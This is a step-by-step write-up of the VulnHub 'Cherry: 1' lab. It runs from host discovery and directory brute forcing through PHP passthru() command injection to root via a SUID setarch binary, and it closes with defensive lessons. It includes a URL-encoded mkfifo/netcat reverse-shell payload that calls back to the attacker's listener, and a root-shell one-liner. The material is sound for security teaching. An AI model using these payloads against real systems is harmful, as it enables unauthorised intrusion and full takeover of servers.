# Cherry: 1 — Intermediate VulnHub Walkthrough

A beginner-friendly, step-by-step walkthrough of the **Cherry: 1** boot2root challenge
from VulnHub. Every command is explained and every output is shown as you would see it.
Small details **vary by build**, so if a version number or filename differs slightly on
your machine, that is normal.

| Field | Value |
|---|---|
| **Machine** | Cherry: 1 |
| **Difficulty** | Intermediate |
| **Author** | SunCSR Team |
| **Released** | 14 September 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/cherry-1,552/ |
| **Download** | https://vulnhub.com/entry/cherry-1,552/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Ubuntu Linux 20.04 (Focal) |

> **Why it works:** Cherry chains two common mistakes: a PHP script that executes
> attacker-supplied operating-system commands, and a file with the SUID bit set that
> should never carry it. Each of these alone is enough to hand over root.

---

## 0. What you will learn

By the end of this walkthrough you will have practised:

- **Host discovery** — finding the target on your lab network.
- **Nmap scanning** — spotting multiple web servers on non-standard ports.
- **Web directory brute forcing** — finding hidden files with Gobuster/DirBuster.
- **Command injection** — exploiting a PHP `passthru()` call for remote code execution.
- **Reverse shells** — catching a shell on your Kali listener.
- **SUID privilege escalation** — abusing a SUID binary (`setarch`) to become root.

No prior experience is required. Follow along, read the outputs, and understand *why*
each step works.

> **Note on networking:** This VM was built for VMware and, on VirtualBox, the network
> interface name may need adjusting before it gets an IP address. See the VulnHub entry
> comments / author notes if the box does not appear on the network.

---

## 1. Reconnaissance — finding the target

Kali is `192.168.56.10`; we need the target's address on the host-only network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Discover live hosts:

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.

   IP            At MAC Address     Count   Len   MAC Vendor
 -------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00     1    60   PCS Systemtechnik
 192.168.56.10   0a:00:27:00:00:09     1    60   PCS Systemtechnik
 192.168.56.101  08:00:27:8b:4d:1a     2    96   PCS Systemtechnik
```

> **Why it works:** `netdiscover` sends ARP probes to every address in the subnet. Any
> host that replies is alive. The target is **`192.168.56.101`**.

![Finding the target with netdiscover](images/01-netdiscover.png)

---

## 2. Enumeration

### 2.1 Nmap service scan

```bash
nmap -p- -sC -sV 192.168.56.101 -oN cherry_first_scan.txt
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00025s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cherry
7755/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cherry
33060/tcp open  mysqlx?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-p-` scans all ports, `-sV` identifies versions, and `-sC` runs
> default scripts. Notice **two web servers**: nginx on port 80 and Apache on port 7755.
> Both show a page titled "Cherry".

### 2.2 Look at both web servers

Open `http://192.168.56.101/` and `http://192.168.56.101:7755/` in a browser.

Both show the same simple landing page. That tells us the more interesting content is
probably behind a hidden path — so we brute force directories.

### 2.3 Directory brute forcing

```bash
gobuster dir -u http://192.168.56.101:7755 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x html,php,txt
```

```text
/icons/            (Status: 301)
/backup/           (Status: 301)
/backup/command.php (Status: 200)
/backup/latest.tar.gz (Status: 200)
/backup/master.zip.bak (Status: 200)
/backup/master.zip (Status: 200)
/index.html        (Status: 200)
/info.php          (Status: 200)
/server-status     (Status: 403)
```

> **Why it works:** Gobuster requests every word in the wordlist as a path and reports
> the HTTP status. `200`/`301` means the path exists. We found a `/backup/` directory
> containing `command.php`.

If you prefer a graphical tool, DirBuster does the same job:

```bash
dirbuster -u http://192.168.56.101:7755 -l /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 -e html,htm,php,txt -v
```

![Gobuster discovering the /backup directory](images/02-gobuster.png)

---

## 3. Foothold

### 3.1 Inspect command.php

On port 80 the same file downloads instead of running; on port 7755 Apache executes PHP.
Fetch it and read the source:

```bash
curl http://192.168.56.101:7755/backup/command.php
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Backup</title>
</head>
<body>
<!-- </?php echo passthru($_GET['backup']); ?/> -->
</body>
</html>
```

> **Why it works:** The comment reveals the real logic: the script calls PHP's
> `passthru()` with the value of the `backup` GET parameter and prints the result. That
> means **any OS command we put in `backup=` runs on the server** — classic command
> injection / remote code execution.

### 3.2 Prove command execution

```bash
curl "http://192.168.56.101:7755/backup/command.php?backup=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The `id` command printed the web server's user, `www-data`. Commands
> run with the privileges of the web server process.

### 3.3 Get a reverse shell

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Now trigger the payload through the vulnerable parameter (URL-encoded):

```bash
curl "http://192.168.56.101:7755/backup/command.php?backup=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.10%204444%20%3E%2Ftmp%2Ff"
```

```text
listening on [any] 4444 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 41234
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The `mkfifo` + `nc` trick creates a named pipe and connects the
> server's shell back to our listener. The `%20` etc. are just URL-encoded spaces and
> special characters so the browser/curl passes them intact.

### 3.4 Upgrade to an interactive shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```text
www-data@cherry:/var/www/html/backup$
```

> **Why it works:** `pty.spawn` gives us a proper pseudo-terminal so interactive
> commands behave normally.

![Reverse shell as www-data](images/03-reverse-shell.png)

---

## 4. Privilege escalation

### 4.1 Search for SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/setarch
...
```

> **Why it works:** The `find` command lists files with the **SUID** bit set. A SUID
> binary runs with the privileges of its owner (here, root) — even when a low-privileged
> user starts it. `/usr/bin/setarch` is unusual and stands out.

### 4.2 Confirm the setarch permissions

```bash
ls -alh /usr/bin/setarch
```

```text
-rwsr-sr-x 1 root root 27K Apr  2  2020 /usr/bin/setarch
```

> **Why it works:** The `s` in `-rwsr-sr-x` is the SUID bit. Because `setarch` is owned
> by root and is SUID, it can be abused to launch a shell as root.

### 4.3 Exploit setarch (GTFOBins)

```bash
setarch $(arch) /bin/sh -p
```

```text
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

> **Why it works:** `setarch` re-runs a program under a given architecture. Because it is
> SUID-root, the `/bin/sh` it launches runs with effective UID 0. The `-p` flag tells
> `sh` to keep the elevated privileges instead of dropping them. This exact technique is
> documented on GTFOBins.

### 4.4 Read the root flag

```bash
cd /root
ls
cat proof.txt
```

```text
Sun_CSR_TEAM.af6d45da1f1181347b9e2139f23c6a5b
```

![Root shell and root flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Why it is dangerous |
|---|---|---|---|
| 1 | OS command injection | `command.php` via PHP `passthru()` | Attacker-supplied input runs as OS commands |
| 2 | Sensitive files exposed | `/backup/` directory listing | Leaks source code and archives |
| 3 | PHP source disclosure | Same file readable/executed on two ports | Reveals the injection point |
| 4 | SUID binary abuse | `/usr/bin/setarch` set SUID-root | Lets any user spawn a root shell |

---

## 6. Defensive lessons (blue team)

- **Never pass user input to shell execution.** Replace `passthru()`/`exec()`/`system()`
  with safe APIs, and validate/allow-list all inputs.
- **Disable directory listing and remove backup archives** from web roots. Backups often
  contain source code, credentials, and configuration.
- **Avoid running PHP on stray ports.** Serving the same code with different server
  configs can expose behaviour (like source download) you did not intend.
- **Audit SUID binaries.** Run `find / -perm -u=s -type f` regularly and remove the SUID
  bit from anything that does not strictly need it — especially shells and setuid
  launchers such as `setarch`.
- **Run web servers as an unprivileged user** (already true here) and apply OS hardening
  such as `noexec` on writable web directories.
- **Patch and version-check services** and keep the attack surface minimal.

---

## 7. References

- VulnHub — Cherry: 1 entry: https://vulnhub.com/entry/cherry-1,552/
- GTFOBins — `setarch`: https://gtfobins.github.io/gtfobins/setarch/
- PHP `passthru()` manual: https://www.php.net/manual/en/function.passthru.php
- OWASP — Command Injection:
  https://owasp.org/www-community/attacks/Command_Injection
- OWASP — OS Command Injection Defense Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- GTFO / SUID background: https://gtfobins.github.io/

---

## 8. Screenshot checklist

Capture these screens as you go so your writeup is complete:

- [ ] `images/01-netdiscover.png` — host discovery showing `192.168.56.101`
- [ ] `images/02-gobuster.png` — Gobuster finding `/backup/` and `command.php`
- [ ] `images/03-reverse-shell.png` — reverse shell as `www-data` (`id`)
- [ ] `images/04-root-flag.png` — root shell plus `cat /root/proof.txt`
- [ ] `images/05-command-injection.png` — the `?backup=id` proof of RCE
- [ ] `images/06-suid-find.png` — `find` output showing `/usr/bin/setarch`
- [ ] `images/07-proof.png` — final combined proof screenshot

> **Why it works:** A clear screenshot trail proves reproducibility and is the same kind
> of evidence a professional penetration-test report would include.
